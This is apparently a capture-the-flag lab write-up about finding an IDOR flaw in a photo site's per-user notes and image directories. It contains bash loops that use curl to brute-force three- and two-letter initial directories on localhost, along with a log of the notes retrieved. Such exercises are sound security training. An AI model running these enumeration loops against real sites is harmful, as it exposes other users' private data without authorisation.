Found 2 directories in testing which are shared. The first was found via the images links on the main page the second was discovered in the json returns from the create user option.

Dirs
* images/<INITIALS>/0
* notes/<INITALS>/0

Manually stepped through the images which were shared already via the main page. They are
* MC
* TW
* BD

No **contiguous** image was revealed.

Looking at their notes for these 3 users, We find the following peices of information:

Two names which do not appear in the above
* Beth - Site Admin
* John - From a band

Also, there are middle initials for unnames users, or those above, starting with U, D and D.

When creating a user, All caps are used and the directory created is First Initial, Middle Initial and Last Initial. So, 3 characters, such as FML. Potentially, leaving middle blank will result in a 1 character.

Thus, we should be able to brute force this space with some bash scripting.

### 3 character brute force
```
for a in {A..Z}; do for b in {A..Z}; do for c in {A..Z}; do echo "$(curl http://localhost:6868/notes/$a$b$c --silent) -- $a$b$c" | tee -a 3combo.txt; done; done; done
 1188  for a in {A..Z}; do for b in {A..Z}; do for c in {A..Z}; do echo "$(curl http://localhost:6868/notes/$a$b$c/0 --silent) -- $a$b$c" | tee -a 3combo.txt; done; done; done
```

### 2 character brute force
```
for a in {A..Z}; do for b in {A..Z}; do echo "$(curl http://localhost:6868/notes/$a$b/0 --silent | base64) -- $a$b" | tee -a 2combo_pics.txt; done; done
```

However, doing this brute forcing, only able to find known users and created users

Tried doing the same with the 2 character for the images images directories, but found the same again too.

Log of the notes:
```
root@kali:/home/kali/msf-dec-2020/6868# curl http://local:6868/notes/BD/0 && echo ""
Had a bagel today, it was pretty ok.
root@kali:/home/kali/msf-dec-2020/6868# curl http://local:6868/notes/BD/1 && echo ""
Beth, the site admin, keeps hassling me about consenting to the site changes so she can improve security. I don't see the point tbh, site seems good as it is.
root@kali:/home/kali/msf-dec-2020/6868# curl http://local:6868/notes/BD/2 && echo ""
ಠ_ಠ
root@kali:/home/kali/msf-dec-2020/6868# curl http://local:6868/notes/BD/3 && echo ""
Invalid Note ID
root@kali:/home/kali/msf-dec-2020/6868# curl http://local:6868/notes/TW0 && echo ""
Page Not Found
root@kali:/home/kali/msf-dec-2020/6868# curl http://local:6868/notes/TW/0 && echo ""
TODO:
* Get back to John of the "John likes music" band about shooting times
* Respond to Miss Yager's to confirm that I am ok with her site changes
* Buy another camera. You can never have too many.
root@kali:/home/kali/msf-dec-2020/6868# curl http://local:6868/notes/TW/1 && echo ""
(╯ ͠° ͟ʖ ͡°)╯┻━┻
root@kali:/home/kali/msf-dec-2020/6868# curl http://local:6868/notes/TW/2 && echo ""
I swear if someone asks me to photograph something for free again I'm going to lose it.
root@kali:/home/kali/msf-dec-2020/6868# curl http://local:6868/notes/TW/3 && echo ""
\Invalid Note ID
root@kali:/home/kali/msf-dec-2020/6868# curl http://local:6868/notes/MC/0 && echo ""
REMINDER!!!

Pick up the replacement lens for the Nikon!
root@kali:/home/kali/msf-dec-2020/6868# curl http://local:6868/notes/MC/1 && echo ""
¯\_( ͡° ͜ʖ ͡°)_/¯
root@kali:/home/kali/msf-dec-2020/6868# curl http://local:6868/notes/MC/2 && echo ""
Weirdest thing happened today. I was in the "Photos5u" main office and there was this woman, I think she was one of the techies, and she was ranting about "Eye Doors" or something to the owner. Apparently, our middle names are a threat to the site?!?!? 

Honestly, with middle names like "Ulysses Denise Donnoly" you'd think she'd be happy about hers being in use. Actually now that I think about it, she's probably embaressed about her intials.   


```

The last one, something about IDOR and the middle names it seems.
